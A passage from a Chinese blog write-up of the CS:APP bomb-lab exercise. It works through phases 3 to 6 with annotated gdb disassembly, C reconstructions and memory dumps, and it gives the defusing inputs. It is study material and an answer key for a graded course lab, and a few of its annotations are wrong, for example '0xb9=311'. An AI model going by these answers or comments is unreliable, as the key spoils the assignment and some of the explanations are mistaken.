$0x137,%eax<br>   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax<br>   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;<br>   0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp<br>   0x0000000000400fcd &lt;+138&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><ul><li><p>查看0x4025cf的内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(gdb) <span class="hljs-keyword">x</span>/s <span class="hljs-number">0x4025cf</span><br><span class="hljs-number">0x4025cf</span>:       <span class="hljs-string">&quot;%d %d&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>受第二题启发，我们可以知道输入就在rsp+8和rsp+c</p></li><li><p>第10行说明第一个输入不能大于7</p></li><li><p>第十六行假设第一个输入为1，查看0x402478，</p></li><li><pre><code class="hljs">(gdb) x/x 0x4024780x402478:       0xb9<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br>  <span class="hljs-number">0xb9</span>=<span class="hljs-number">311</span><br><br>  答案 <span class="hljs-number">1</span> <span class="hljs-number">311</span><br><br>## phase_4<br><br>#### 反汇编phase_4<br><br><span class="hljs-string">```</span>assembly<br>Dump of assembler code for function phase_4:<br>   <span class="hljs-number">0x000000000040100c</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x18,%rsp<br>   <span class="hljs-number">0x0000000000401010</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">lea</span>    <span class="hljs-number">0xc</span>(%rsp),%rcx  #第二个输入存在<span class="hljs-number">0xc</span>(%rsp)<br>   <span class="hljs-number">0x0000000000401015</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x8</span>(%rsp),%rdx  #第一个输入存在<span class="hljs-number">0x8</span>(%rsp)<br>   <span class="hljs-number">0x000000000040101a</span> &lt;+<span class="hljs-number">14</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x4025cf,%esi<br>   <span class="hljs-number">0x000000000040101f</span> &lt;+<span class="hljs-number">19</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x0,%eax<br>   <span class="hljs-number">0x0000000000401024</span> &lt;+<span class="hljs-number">24</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;<br>   <span class="hljs-number">0x0000000000401029</span> &lt;+<span class="hljs-number">29</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-number">$0</span>x2,%eax<br>   <span class="hljs-number">0x000000000040102c</span> &lt;+<span class="hljs-number">32</span>&gt;:    <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x401035</span> &lt;phase_4+<span class="hljs-number">41</span>&gt; #输入数量不为<span class="hljs-number">2</span>直接爆<br>   <span class="hljs-number">0x000000000040102e</span> &lt;+<span class="hljs-number">34</span>&gt;:    cmpl   <span class="hljs-number">$0</span>xe,<span class="hljs-number">0x8</span>(%rsp)<br>   <span class="hljs-number">0x0000000000401033</span> &lt;+<span class="hljs-number">39</span>&gt;:    <span class="hljs-keyword">jbe</span>    <span class="hljs-number">0x40103a</span> &lt;phase_4+<span class="hljs-number">46</span>&gt; #若第一个参数&gt;<span class="hljs-number">14</span>，爆<br>   <span class="hljs-number">0x0000000000401035</span> &lt;+<span class="hljs-number">41</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x000000000040103a</span> &lt;+<span class="hljs-number">46</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>xe,%edx #%edx=<span class="hljs-number">0xe</span><br>   <span class="hljs-number">0x000000000040103f</span> &lt;+<span class="hljs-number">51</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x0,%esi #<span class="hljs-built_in">esi</span>=<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x0000000000401044</span> &lt;+<span class="hljs-number">56</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rsp),%edi #%edi=<span class="hljs-number">0x8</span>(%rsp)<br>   <span class="hljs-number">0x0000000000401048</span> &lt;+<span class="hljs-number">60</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400fce</span> &lt;func4&gt;<br>   <span class="hljs-number">0x000000000040104d</span> &lt;+<span class="hljs-number">65</span>&gt;:    <span class="hljs-keyword">test</span>   %eax,%eax<br>   <span class="hljs-number">0x000000000040104f</span> &lt;+<span class="hljs-number">67</span>&gt;:    <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x401058</span> &lt;phase_4+<span class="hljs-number">76</span>&gt; #func4返回值为<span class="hljs-number">0</span>才不爆<br>   <span class="hljs-number">0x0000000000401051</span> &lt;+<span class="hljs-number">69</span>&gt;:    cmpl   <span class="hljs-number">$0</span>x0,<span class="hljs-number">0xc</span>(%rsp) #第二个输入为<span class="hljs-number">0</span>才不爆<br>   <span class="hljs-number">0x0000000000401056</span> &lt;+<span class="hljs-number">74</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x40105d</span> &lt;phase_4+<span class="hljs-number">81</span>&gt;<br>   <span class="hljs-number">0x0000000000401058</span> &lt;+<span class="hljs-number">76</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x000000000040105d</span> &lt;+<span class="hljs-number">81</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x18,%rsp<br>   <span class="hljs-number">0x0000000000401061</span> &lt;+<span class="hljs-number">85</span>&gt;:    <span class="hljs-keyword">ret</span><br>End of assembler dump.<br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="反汇编func4"><a href="#反汇编func4" class="headerlink" title="反汇编func4"></a>反汇编func4</h4><p>int func4 ( int edi, int esi, int edx ) 返回值放在 eax</p><p>注释为初始情况下第一次的情况 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function func4:<br>   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax #%eax=%edx<br>   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax #%eax=%edx-%esi=0xe<br>   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx #%ecx=%eax=0xe<br>   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx #%ecx=(%eax&gt;&gt;31)<br>   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax #%eax=(%eax&gt;&gt;31)<br>   0x0000000000400fdd &lt;+15&gt;:    sar    %eax #右移一位 %eax=((%eax&gt;&gt;31)&gt;&gt;1) %eax=0x7<br>   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx #ecx=%rax+%rsi=0x7<br>   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx #0x7-x1<br>   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt; #edi&gt;=ecx时跳转<br>   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx #此处的条件是ecx&gt;edi，<br>   0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt; #调用func4（edi,esi,ecx-1）<br>   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax #返回结果2*func4（edi,esi,ecx）<br>   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;<br>   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax #此处的条件是ecx&lt;=edi，eax=0 <br>   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx #ecx-edi=0x7-x1<br>   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt; #edi&lt;=ecx跳转<br>   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi  <br>   0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt; #调用func4(edi,esi+1,edx)<br>   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax #返回2*func4(edi,esi+1,edx)+1<br>   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp<br>   0x000000000040100b &lt;+61&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>C语言代码实现func4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span> <span class="hljs-params">( <span class="hljs-type">int</span> edi, <span class="hljs-type">int</span> esi, <span class="hljs-type">int</span> edx )</span> <span class="hljs-comment">//初始值:edi=x1,esi=0x0,edx=0xe</span><br>&#123;<span class="hljs-comment">// 返回值为eax</span><br>    eax = edx - esi;  <span class="hljs-comment">//3、4行</span><br>    eax = (eax + (eax &gt;&gt; <span class="hljs-number">31</span>)) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">//5-8行</span><br>    ecx = eax + exi;  <span class="hljs-comment">//9行</span><br>    <span class="hljs-keyword">if</span>(edi &lt; ecx) <br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">2</span> * func4(edi, esi, edx - <span class="hljs-number">1</span>); <span class="hljs-comment">//14行</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (edi &gt; ecx)<br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">2</span> * func4(edi, esi + <span class="hljs-number">1</span>, edx) + <span class="hljs-number">1</span>; <span class="hljs-comment">//21行</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span>  <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>发现x&#x3D;7直接满足条件</strong></p><p>答案7 0 </p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_5:<br>   0x0000000000401062 &lt;+0&gt;:     push   %rbx<br>   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp #32字节栈帧<br>   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx #输入存放在%rbx中<br>   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax  <br>   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp) #fs段偏移0x28存放到%rsp+0x18<br>   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax #eax置0<br>   0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt; <br>   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax #比较长度是否为6，不为6直接爆炸<br>   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;<br>   0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;<br>   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx #%ecx=%ebx+%rax<br>   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)<br>   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx<br>   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx #截断取最后四位<br>   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx<br>   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1) dl低4位到rsp+rax+10<br>   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax<br>   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax #%rax作为计数器<br>   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;<br>   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)<br>   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi<br>   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi<br>   0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br>   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax<br>   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;<br>   0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)<br>   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;<br>   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax <br>   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;<br>   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax<br>   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax<br>   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;<br>   0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp<br>   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx<br>   0x00000000004010f3 &lt;+145&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p><strong>0x4024b0处：maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</strong></p><p>+41到+74的代码使用gpt转换后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">phase_5</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* rbx)</span> &#123;<br>    <span class="hljs-type">int</span> rax = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> rsp_value;<br>    <span class="hljs-keyword">while</span> (rax != <span class="hljs-number">6</span>) &#123;<br>        <span class="hljs-type">char</span> ecx = rbx[rax];<br>        *(<span class="hljs-type">char</span>*)(&amp;rsp_value) = ecx;<br>        <span class="hljs-type">int</span> rdx = rsp_value;<br>        rdx &amp;= <span class="hljs-number">0xf</span>;<br>        <span class="hljs-type">int</span> edx = *(<span class="hljs-type">char</span>*)(<span class="hljs-number">0x4024b0</span> + rdx);<br>        *(<span class="hljs-type">char</span>*)(&amp;rsp_value + rax + <span class="hljs-number">0x10</span>) = edx;<br>        rax += <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>退出循环时，%rsp+10处以此存储着6个字符</p><p>继续看+76后的代码</p><p><strong>查看0x40245e</strong></p><p>字符串：flyers</p><p>调用strings_not_equal函数，判断栈上的六个字符是否与这个字符串的相等。</p><p>我们能够知道，这六个字符是通过我们输入的字符的ascii码的低4位作为索引，查找<strong>maduiersnfotvbyl</strong>这个i部分 的字符。</p><p>在<strong>maduiersnfotvbyl</strong>中，f为第9位，l第15位，y第14位，e第5位，r第6位，s第7位。</p><p>即我们输入的字符，其ascii码的低4位依次是1001,1111,1110,0101,0110,0111。</p><p>即答案为ionuvw</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r14<br>0x00000000004010f6 &lt;+2&gt;:     push   %r13<br>0x00000000004010f8 &lt;+4&gt;:     push   %r12<br>0x00000000004010fa &lt;+6&gt;:     push   %rbp<br>0x00000000004010fb &lt;+7&gt;:     push   %rbx<br>0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp<br>0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13<br>0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi<br>0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt; <br></code></pre></td></tr></table></figure><p>调用read_six_numbers函数，参考phase_2 </p><p>rsp处存放6个数字 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14<br>0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d<br>0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp<br>0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax<br>0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax<br>0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax<br>0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt; #输入[r13]-1&lt;=5跳转<br>0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt; #输入[r13]-1&gt;5直接爆<br>0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d <br>0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d <br>0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt; #跳出循环<br>0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx<br>0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax<br>0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax  <br>0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp) #输入[r12d]与输入[r13]比较  <br>0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt; #不相等跳转<br>0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt; #两数字相等才爆<br>0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx<br>0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx<br>0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13<br>0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;<br></code></pre></td></tr></table></figure><p>这一部分对输入的要求</p><ul><li>不大于6</li><li>互不相同</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi<br>0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax<br>0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx<br>0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx #edx=7<br>0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx <br>0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax) #<br>0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax<br>0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax<br>0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;<br></code></pre></td></tr></table></figure><p>这一part简单的c语言转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">rsi=<span class="hljs-number">0x18</span>(%rsp)<br><span class="hljs-keyword">for</span>(rax=%r14,rax&lt;rsi,rax++)<br> &#123;num[rax]=<span class="hljs-number">7</span>-n[rax]；&#125; <span class="hljs-comment">//假设输入数组名为n，变换后的为num</span><br></code></pre></td></tr></table></figure><p>可以看到这一part主要是对输入进行了简单的变换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi<br>0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;<br>0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx<br>0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax<br>0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax<br>0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx<br>0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2) #rsp=rsp+rsi*2+0x20<br>0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi #rsi+=0x4<br>0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi <br>0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt; #rsi=0x18跳转<br>0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx #ecx=rsp+rsi=num[rsi]<br>0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx  #ecx&lt;=1跳转<br>0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;<br>0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax #num[rsi]&gt;1<br>0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx<br>0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;<br></code></pre></td></tr></table></figure><ul><li><p>+163: <code>ecx=num[rsi]</code></p></li><li><p>+166:如果<code>num[0]=1</code>跳转</p></li><li><p>+143:查看0x6032d0内存空间</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">(gdb) x/<span class="hljs-number">24</span>x <span class="hljs-number">0x6032d0</span><br><span class="hljs-number">0x6032d0</span> &lt;node1&gt;:       <span class="hljs-number">0</span>x0000014c      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0</span>x<span class="hljs-number">006032e0</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032e0</span> &lt;node2&gt;:       <span class="hljs-number">0</span>x<span class="hljs-number">000000a8</span>      <span class="hljs-number">0x00000002</span>      <span class="hljs-number">0</span>x<span class="hljs-number">006032f0</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032f0</span> &lt;node3&gt;:       <span class="hljs-number">0</span>x0000039c      <span class="hljs-number">0x00000003</span>      <span class="hljs-number">0x00603300</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603300</span> &lt;node4&gt;:       <span class="hljs-number">0</span>x<span class="hljs-number">000002b3</span>      <span class="hljs-number">0x00000004</span>      <span class="hljs-number">0x00603310</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603310</span> &lt;node5&gt;:       <span class="hljs-number">0</span>x000001dd      <span class="hljs-number">0x00000005</span>      <span class="hljs-number">0x00603320</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603320</span> &lt;node6&gt;:       <span class="hljs-number">0</span>x000001bb      <span class="hljs-number">0x00000006</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span><br></code></pre></td></tr></table></figure><p>不难发现这是一个 <strong>链表结构</strong> 第一列是数值，第二列序号，第三列是下一个节点的地址</p></li><li><p>+148~+161: node[2]&#x3D;node[1]-&gt;next</p></li><li><p>+171:num[rsi]&gt;1时，eax&#x3D;1,edx&#x3D;0x6032d0，然后跳转</p></li><li><p>+130:rdx&#x3D;rdx+0x8,eax++,eax!&#x3D;ecx则一直循环</p></li><li><p>当ecx&#x3D;eax时，rsp&#x3D;node[num[i]]</p></li></ul><p>至此 我们可以发现，这一部分的操作是将指针移动到<strong>node[num[i]]处</strong>，即栈空间的依次存放着node[num[0]]~node[num[6]]。</p><p>此时<strong>栈空间</strong>的情况如下表所示</p><table><thead><tr><th align="center">栈地址</th><th align="center">内容</th></tr></thead><tbody><tr><td align="center">rsp+0x48</td><td align="center">node[num[5]]</td></tr><tr><td align="center">rsp+0x40</td><td align="center">node[num[4]]</td></tr><tr><td align="center">rsp+0x38</td><td align="center">node[num[3]]</td></tr><tr><td align="center">rsp+0x30</td><td align="center">node[num[2]]</td></tr><tr><td align="center">rsp+0x28</td><td align="center">node[num[1]]</td></tr><tr><td align="center">rsp+0x20</td><td align="center">node[num[0]]</td></tr><tr><td align="center">rsp+0x14</td><td align="center">num[5]</td></tr><tr><td align="center">rsp+0x10</td><td align="center">num[4]</td></tr><tr><td align="center">rsp+0xc</td><td align="center">num[3]</td></tr><tr><td align="center">rsp+0x8</td><td align="center">num[2]</td></tr><tr><td align="center">rsp+0x4</td><td align="center">num[1]</td></tr><tr><td align="center">rsp</td><td align="center">num[0]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx 